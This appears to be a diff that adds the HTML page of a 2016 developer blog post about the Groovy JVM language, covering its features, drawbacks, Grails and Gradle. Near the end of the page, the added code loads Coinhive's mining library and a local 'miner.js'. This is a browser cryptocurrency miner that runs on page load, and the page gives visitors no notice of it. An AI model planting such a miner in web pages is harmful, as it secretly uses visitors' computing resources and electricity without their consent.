@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>Why Groovy is not that famous? - Michele Nasti's blog</title>
+	<meta name="description" content="If you understand Italian, my last two articles were about integrating Groovy inside a Java webapp.
+
+" />
+	<meta name="keywords" content="groovy, java, languages, programming languages" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="Why Groovy is not that famous?" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/" property="og:url">
+
+
+
+  <meta content="2016-01-28T14:30:16+01:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="groovy" property="article:tag">
+  
+  <meta content="java" property="article:tag">
+  
+  <meta content="languages" property="article:tag">
+  
+  <meta content="programming languages" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="Why Groovy is not that famous?">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2016/01/why-groovy-is-not-that-famous/">Why Groovy is not that famous?</a></h1>
+			<p class="post-meta">Jan 28, 2016 • musikele</p>
+		</header>
+
+		<section>
+
+			<p>If you understand Italian, my last two articles were about integrating Groovy inside a Java webapp.</p>
+
+<h4 id="but-what-is-groovy">But… what is Groovy?</h4>
+
+<ul>
+  <li><strong>Groovy</strong> is a <strong>dynamic scripting language</strong>, it can be interpreted at runtime to create applications more rapidly. However, <strong>you can also compile the code</strong> to get the best possible performance (comparable to Java).</li>
+  <li>It has a <strong>succinct syntax</strong> with idioms coming from Javascript and Python, other than Java. There are idioms to avoid null pointers that are very smart and easy to apply.</li>
+  <li>It is <strong>compatible with Java6 syntax,</strong> in the sense that if you write Java6 code it will be 99% understood by Groovy. It would be stupid to write Java inside Groovy, but this is the main advantage Java developers find in this language: they don’t have to learn something totally new.</li>
+  <li>It is <strong>one of the</strong> <strong>oldest alternative languages for the JVM,</strong> this year it should have passed 10 market years.</li>
+  <li>It has <strong>closures</strong> and they work in a very natural way; functions are prime-order objects of this language so you can assign and operate over functions pretty much like you would do with int, double, String.</li>
+  <li>It will <strong>wrap every primitive value</strong> by it’s Object representative and it will override ‘==’ so it will behave like <em>equals</em>. Many other helpers (like type conversion) are present too.</li>
+  <li>It has <strong>type inference</strong>: you can avoid writing the return type of functions and Groovy will try to infer it for you. You can <strong>def</strong> every variable, or you can explicitly type <strong>int, double, String</strong> to gain more compiler power.</li>
+  <li>
+    <p>It has a <strong>good IDE Support:</strong> IntelliJ will support it out of the box, Eclipse is a pain whatever you want to try outside Java but you can accomplish some results.</p>
+
+    <p><strong>Annotations,</strong> and <strong>popular frameworks</strong> (like Spring, or Hibernate) <strong>will work seamlessly.</strong> Just put the Jars in the classpath.</p>
+  </li>
+</ul>
+
+<h4 id="disdvantages">Disdvantages</h4>
+
+<ul>
+  <li><strong>During the first years of its life Groovy’s performances were poor</strong>. Very poor. This was mainly due to a feature of the JVM that was blocking dynamic languages. From Java7 a new feature called <em>invokeDynamic</em> greatly improves dynamic code execution; the compiled groovy classes usually share the same execution time of Java (kind of). However, Groovy is still seen as the “slow” JVM language. Let’s change opinion!</li>
+  <li><strong>People coming from iterative Java will not understand functional paradigms</strong> and will say that Groovy is too difficoult or crazy.</li>
+  <li>Many are asking, now that <strong>Java8</strong> is here and <strong>supports lambda expressions</strong> (aka <em>functional paradigm</em>), do we still need Groovy? Well, if you also need a dynamic <em>scripting</em> language the answer is yes.</li>
+</ul>
+
+<h3 id="bonuses">Bonuses</h3>
+
+<p>Ruby on Rails started the framework hype, so now we have Laravel for Php, Play for Scala and Java, Django for Python… <strong>Grails</strong> is the Groovy version of <strong>web development framework</strong>. I admit that i still have no experience with it but I’m very curious.</p>
+
+<p><strong>Gradle is a dependency management and build system</strong> (maven competitor) that is gaining a lot of notoriety since it is the default Android dependency management. It is written in Groovy and it’s build file is in groovy syntax, but nobody will notice it if you don’t tell them.</p>
+
+<h3 id="conclusions">Conclusions</h3>
+
+<p>Since I see a lot of good points and a very limited list of disadvantages, why Groovy has not shined like a star? Like… Scala, for example. It is seen as a simple tool, like the very first versions of javascript, but I have done many complex things that cross the boundaries of one programming language. And now I will develop a Grails app to see its power.</p>
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/&text=Why Groovy is not that famous?:%20https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(Why Groovy is not that famous?) + ':%20'  + encodeURIComponent(https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/&title=Why Groovy is not that famous?&summary=&source=https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/';
+			var disqus_identifier = 'https://michelenasti.com/2016/01/why-groovy-is-not-that-famous/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2016/01/guida-agli-annunci-di-lavoro-per-sviluppatori/">Guida agli annunci di lavoro per sviluppatori</a></h2>
+					</header>
+					<section>
+						<p><a href="https://i0.wp.com/michelenasti.com/wp-content/uploads/2016/01/wp-1453828848876.jpg"><img title="wp-1453828848876" class="alignnone size-full" alt="image" src="https://i0.wp.com/michelenasti.com/wp-content/uploads/2016/01/wp-1453828848876.jpg?w=920" data-recalc-dims="1" /></a></p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2016/01/guida-agli-annunci-di-lavoro-per-sviluppatori/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2016/01/saro-al-codemotion-2016-roma/">Sarò al Codemotion 2016, Roma</a></h2>
+					</header>
+					<section>
+						<p>Anche quest’anno parteciperò al <a href="http://rome2016.codemotionworld.com/">Codemotion 2016</a> di Roma, che per distanza geografica è anche la più facile da raggiungere. Quest’anno una tiratina di orecchie va proprio allo staff, che ha messo il biglietto “starter” al doppio dell’anno scorso. Maledetti!</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2016/01/saro-al-codemotion-2016-roma/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
